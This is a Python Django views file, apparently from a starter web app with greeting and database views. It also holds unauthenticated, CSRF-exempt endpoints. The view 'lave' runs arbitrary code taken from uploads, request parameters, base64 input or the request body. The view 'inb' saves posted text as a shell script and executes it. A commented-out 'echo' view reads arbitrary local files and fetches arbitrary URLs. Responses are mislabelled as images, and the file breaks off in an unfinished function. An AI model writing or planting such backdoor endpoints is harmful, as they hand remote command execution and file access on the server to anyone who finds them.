from django.shortcuts import render
from django.http import HttpResponse

from .models import Greeting
from django.views.decorators.csrf import csrf_exempt
# Create your views here.
# def index(request):
#     # return HttpResponse('Hello from Python!')
#     return render(request, 'index.html')
import requests
def index(request):
	r = requests.get('http://httpbin.org/status/418')
	print(r.text)
	return HttpResponse('<pre>' + r.text + '</pre>')

def get_url_cache_path(root, url):
	import os
	from hashlib import md5
	h = md5()
	h.update(url.encode("UTF-8"))
	h = h.hexdigest()
	a = h[0:2]
	b = h[2:]
	f = os.path.join(root, a, b)
	if os.path.exists(f):
		return f

# @csrf_exempt
# def echo(r):
# 	try:
# 		g = r.POST or r.GET
# 		body = g.get('body')
# 		if body:
# 			body = json.loads(body)
# 			return supply(body)
# 		u = g.get('u')
# 		if u:
# 			a = g.get('a')
# 			while 1:
# 				if u.startswith("file://"):
# 					import os
# 					u = u[7:]
# 					if a:
# 						a = int(a)
# 						b = int(g.get('b'))
# 						with open(u, 'rb') as f:
# 							n = b - a + 1
# 							f.seek(a)
# 							r = f.read(n)
# 					else:
# 						with open(u, 'rb') as f:
# 							r = f.read()
# 					break
# 				if ('check_cache' in g):
# 					p = get_url_cache_path('.dbu', u)
# 					if p:
# 						if a:
# 							a = int(a)
# 							b = int(g.get('b'))
# 							with open(p, 'rb') as f:
# 								n = b - a + 1
# 								f.seek(a)
# 								r = f.read(n)
# 						else:
# 							with open(p, 'rb') as f:
# 								r = f.read()
# 						break
# 				if a:
# 					b = g.get('b')
# 					r = requests.get(u, headers={'Range': 'bytes=%s-%s' % (a, b)})
# 				else:
# 					r = requests.get(u)
# 				break
# 			return HttpResponse(r, content_type=(g.get('t') or 'image/png'))
# 		u = g.get('h')
# 		if u:
# 			h = None
# 			while 1:
# 				if u.startswith("file://"):
# 					import os
# 					u = u[7:]
# 					h = {'Accept-Ranges': 'bytes', 'Content-Length' : os.stat(u).st_size}
# 					if g.get('hash') == 'md5':
# 						from hashlib import md5
# 						d = md5()
# 						with open(u, 'rb') as f:
# 							r = f.read(1024*1024)
# 							while r:
# 								d.update(r)
# 								r = f.read(1024*1024)
# 							h['Hash'] = d.hexdigest()
# 					break
# 				if ('check_cache' in g):
# 					p = get_url_cache_path('.dbu', u)
# 					if p:
# 						import os
# 						h = {'Accept-Ranges': 'bytes', 'Content-Length' : os.stat(p).st_size}
# 						if g.get('hash') == 'md5':
# 							from hashlib import md5
# 							d = md5()
# 							with open(p, 'rb') as f:
# 								r = f.read(1024*1024)
# 								while r:
# 									d.update(r)
# 									r = f.read(1024*1024)
# 								h['Hash'] = d.hexdigest()
# 						break
# 				h = requests.head(u, allow_redirects=True).headers
# 				break
# 			if h:
# 				return HttpResponse("\n".join(["%s: %s" % (k, h[k]) for k in h]), content_type=(g.get('t') or 'image/png'))
# 			return HttpResponse('No headers', content_type="image/png")
# 		u = g.get('l')
# 		if u:
# 			a = g.get('a')
# 			t = g.get('t')
# 			if a:
# 				a = int(a)
# 				import os
# 				s = os.stat(u).st_size
# 				assert (s >= 0)
# 				b = int(g.get('b'))
# 				b = min(b, s - 1)
# 				assert (b >= 0)
# 				assert (b > a)
# 				with open(u, 'rb') as o:
# 					n = (b - a) + 1
# 					o.seek(a)
# 					r = o.read(n)
# 			else:
# 				o = open(u, 'rb')
# 				r = o.read()
# 				o.close()
# 			return HttpResponse(r, content_type=(t or 'image/png'))
# 		return HttpResponse('No URL', content_type="image/png")
# 	except:
# 		from traceback import format_exc
# 		return HttpResponse(format_exc(), status=500, content_type="image/png")

@csrf_exempt
def lave(request):
	data="None"
	try:
		aux = {}
		method=None
		while 1:
			REQ = request.POST or request.GET
			method = REQ.get('method')
			data = request.FILES
			if data:
				data = data.get('eval')
				if data:
					data = data.read().decode("UTF-8")
					break
			if REQ:
				data = REQ.get('eval', False)
				if data:
					break
				data = REQ.get('enc', False)
				if data:
					from base64 import b64decode
					data = b64decode(data)
					break
			data = request.body.decode("UTF-8")
			break
		if method:
			aux['request'] = request
			exec(data + "\naux['result'] = main(aux['request'])")
			return aux['result']
		exec(data)
		return aux['main'](request)
	except:
		from traceback import format_exc
		return HttpResponse(format_exc() + "-----\n" + data + "\n-----", status=500, content_type="image/png")

@csrf_exempt
def inb(request):
	req = request.POST
	from pprint import pformat
	open("mail.txt", "w").write(pformat(req))
	try:
		data = req.get("plain")
		if data:
			###
			from json import dump
			json_path = "mail.json"
			with open(json_path, "w") as f:
				dump(req, f)
			###
			from re import compile
			import os
			prre = compile("^(\s*#\s*!\s*)([^\s+]+)")
			data = data.strip()
			m = prre.search(data)
			while m:
				m = m.group(2)
				if os.path.exists(m):
					break
				from subprocess import check_output
				m = check_output(["which", m], shell=True)
				if m and os.path.exists(m):
					data = prre.sub(lambda g: g.group(1) + m, data)
				break
			###
			scrp_path = os.path.abspath("mail.sh")
			with open(scrp_path, "w") as f:
				f.write(data)
			cmd = [scrp_path, json_path]
			###
			if cmd:
				from subprocess import Popen, PIPE, STDOUT, call
				import stat
				st = os.stat(scrp_path)
				os.chmod(scrp_path, st.st_mode | stat.S_IEXEC)
				return HttpResponse(str(Popen(cmd, stdout=PIPE, stderr=STDOUT).pid))
	except:
		from traceback import format_exc
		m = format_exc()
		open("mail.log", "w").write(m)
		return HttpResponse(m, status=500, content_type="image/png")
	return HttpResponse("OK")

def db(request):

	greeting = Greeting()
	greeting.save()

	greetings = Greeting.objects.all()

	return render(request, 'db.html', {'greetings': greetings})

def supply(json):
	kind = json.get("kind")
	if kind == "list":
		d = json.get("directory", ".")


